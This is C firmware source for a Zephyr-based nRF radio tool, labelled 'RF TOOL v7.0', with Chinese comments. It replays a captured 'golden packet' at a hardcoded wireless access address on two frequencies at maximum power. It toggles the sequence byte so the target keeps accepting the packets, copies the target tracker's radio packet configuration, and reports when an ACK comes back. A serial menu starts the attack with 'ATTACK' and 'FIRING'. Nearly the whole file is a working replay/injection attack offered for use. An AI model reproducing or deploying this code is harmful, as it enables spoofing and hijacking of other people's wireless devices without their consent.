#include <zephyr/kernel.h>
#include <zephyr/sys/printk.h>
#include <hal/nrf_radio.h>
#include <zephyr/usb/usb_device.h>
#include <zephyr/drivers/gpio.h>
#include <zephyr/drivers/uart.h>
#include <string.h>
#include <stdint.h>

// ================= 參數設定 =================
static const uint8_t TARGET_FREQS[] = {4, 78};
#define TARGET_ADDR_BASE   0xd235cf35
#define TARGET_ADDR_PREFIX 0x00

// ================= 數據庫 =================
// 黃金封包: 16 00 00 21 20 80 0F AF...
// 我們需要把這個封包拆解，餵給硬體去組裝
static uint8_t GOLDEN_PAYLOAD[] = {
    // 注意：這裡不包含第一個 Byte (16)，因為 16 是長度，會由硬體自動處理
    // 這裡從 00 00 21... 開始
    0x00, 0x00, 0x21, 0x20, 0x80, 0x0F, 0xAF, 
    0xF0, 0x00, 0x00, 0xC0, 0x0D, 0xFF, 0xF0, 0x0F, 
    0xCF, 0x00, 0x29, 0x79, 0x10, 0x27, 0x68, 0xD8, 
    0x2A, 0x88, 0x31, 0x98, 0x23, 0x00, 0x00, 0x00
};

// ===========================================

#define LED0_NODE DT_ALIAS(led0)
static const struct gpio_dt_spec led = GPIO_DT_SPEC_GET(LED0_NODE, gpios);
const struct device *uart_dev = DEVICE_DT_GET(DT_CHOSEN(zephyr_console));

static uint8_t packet_buffer[64];
static bool attack_active = false;
static bool swap_address = false;

uint32_t reverse_32(uint32_t n) {
    return ((n>>24)&0xff) | ((n<<8)&0xff0000) | ((n>>8)&0xff00) | ((n<<24)&0xff000000);
}

void radio_init_s1_match(void) {
    NRF_RADIO->POWER = 0;
    k_busy_wait(500);
    NRF_RADIO->POWER = 1;
    
    // 最大功率
    NRF_RADIO->TXPOWER = (RADIO_TXPOWER_TXPOWER_Pos8dBm << RADIO_TXPOWER_TXPOWER_Pos);

    NRF_RADIO->CRCCNF = (RADIO_CRCCNF_LEN_Two << RADIO_CRCCNF_LEN_Pos);
    NRF_RADIO->CRCPOLY = 0x11021; 
    NRF_RADIO->CRCINIT = 0xFFFF;
    NRF_RADIO->MODE = NRF_RADIO_MODE_BLE_2MBIT; 
    
    // ★★★ 關鍵修正：完全模仿追蹤器的 PCNF0 (00040008) ★★★
    // LFLEN = 8 bits
    // S0LEN = 0
    // S1LEN = 4 bits (這能解決 Bit Shift 問題)
    NRF_RADIO->PCNF0 = (8UL << RADIO_PCNF0_LFLEN_Pos) | 
                       (4UL << RADIO_PCNF0_S1LEN_Pos);
    
    // PCNF1
    NRF_RADIO->PCNF1 = (60UL << RADIO_PCNF1_MAXLEN_Pos) | 
                       (4UL  << RADIO_PCNF1_BALEN_Pos) | 
                       (1UL  << RADIO_PCNF1_ENDIAN_Pos) |
                       (32UL << RADIO_PCNF1_STATLEN_Pos);
    
    NRF_RADIO->BASE0 = TARGET_ADDR_BASE;
    NRF_RADIO->PREFIX0 = TARGET_ADDR_PREFIX; 
    NRF_RADIO->TXADDRESS = 0; 
    NRF_RADIO->RXADDRESSES = 1; 
}

void send_on_freq(uint8_t freq) {
    NRF_RADIO->SHORTS = 0;
    NRF_RADIO->TASKS_DISABLE = 1;
    while (NRF_RADIO->EVENTS_DISABLED == 0);
    NRF_RADIO->EVENTS_DISABLED = 0;

    NRF_RADIO->FREQUENCY = freq;
    
    if (swap_address) NRF_RADIO->BASE0 = reverse_32(TARGET_ADDR_BASE);
    else NRF_RADIO->BASE0 = TARGET_ADDR_BASE;

    // 準備封包
    // 這裡有玄機：
    // packet_buffer[0] = Length (我們填 0x16)
    // packet_buffer[1] = S1 (前4bit) + Payload開頭 (後4bit)
    
    // 為了自動切換 SN (16 / 1C)，我們修改 Length 欄位
    // 雖然 0x16 是長度，但 BLE 中 SN 其實藏在 Header 裡
    // 我們直接讓硬體發送我們抓到的 Raw Bytes，但利用 S1LEN 設定讓它對齊
    
    static int toggle_cnt = 0;
    uint8_t header_byte = (toggle_cnt++ % 2 == 0) ? 0x16 : 0x1C;
    
    packet_buffer[0] = header_byte; // Length / Header
    memcpy(&packet_buffer[1], GOLDEN_PAYLOAD, sizeof(GOLDEN_PAYLOAD));
    
    NRF_RADIO->PACKETPTR = (uint32_t)packet_buffer;

    // Turbo Shortcuts
    NRF_RADIO->SHORTS = RADIO_SHORTS_READY_START_Msk | 
                        RADIO_SHORTS_END_DISABLE_Msk | 
                        RADIO_SHORTS_DISABLED_RXEN_Msk |
                        RADIO_SHORTS_RXREADY_START_Msk;

    NRF_RADIO->TASKS_TXEN = 1;

    k_busy_wait(200); 

    // Check ACK
    int timeout_counter = 2000;
    bool ack_received = false;
    
    while(timeout_counter--) {
        if (NRF_RADIO->EVENTS_END) {
            if (NRF_RADIO->CRCSTATUS == 1) {
                ack_received = true;
            }
            NRF_RADIO->EVENTS_END = 0;
            break; 
        }
        k_busy_wait(1);
    }

    NRF_RADIO->SHORTS = 0;
    NRF_RADIO->TASKS_DISABLE = 1;

    if (ack_received) {
        int8_t rssi = -(int8_t)NRF_RADIO->RSSISAMPLE;
        printk(">>> [HIT!] ACK RECEIVED on %d MHz | RSSI: %d\n", 2400+freq, rssi);
        gpio_pin_set_dt(&led, 1);
        k_busy_wait(20000);
        gpio_pin_set_dt(&led, 0);
    }
}

void print_menu() {
    printk("\n\n=== RF TOOL v7.0 (S1 Bit-Alignment Fix) ===\n");
    printk(" [1] ATTACK: Golden Packet (Matched PCNF0)\n");
    printk(" [6] Toggle Address Swap (Current: %s)\n", swap_address ? "SWAPPED" : "NORMAL");
    printk(" [0] STOP\n");
}

void uart_cb(const struct device *dev, void *user_data) {
    uint8_t c;
    if (!uart_irq_update(dev)) return;
    if (!uart_irq_rx_ready(dev)) return;

    while (uart_fifo_read(dev, &c, 1) == 1) {
        switch (c) {
            case '1':
                attack_active = true;
                printk("\n>>> FIRING (S1 Corrected)...\n");
                break;
            case '6':
                swap_address = !swap_address;
                printk("\n>>> ADDRESS SWAP: %s <<<\n", swap_address ? "ON" : "OFF");
                break;
            case '0':
                attack_active = false;
                printk("\n>>> STOPPED <<<\n");
                break;
            default:
                print_menu();
                break;
        }
    }
}

int main(void) {
    usb_enable(NULL);
    if (device_is_ready(led.port)) gpio_pin_configure_dt(&led, GPIO_OUTPUT_ACTIVE);
    
    uart_irq_callback_user_data_set(uart_dev, uart_cb, NULL);
    uart_irq_rx_enable(uart_dev);

    radio_init_s1_match(); 
    k_sleep(K_SECONDS(2));
    print_menu();

    int freq_idx = 0;

    while (1) {
        if (attack_active) {
            send_on_freq(TARGET_FREQS[freq_idx]);
            freq_idx = (freq_idx + 1) % 2; 
        } else {
            gpio_pin_toggle_dt(&led);
            k_sleep(K_MSEC(500));
        }
    }
}
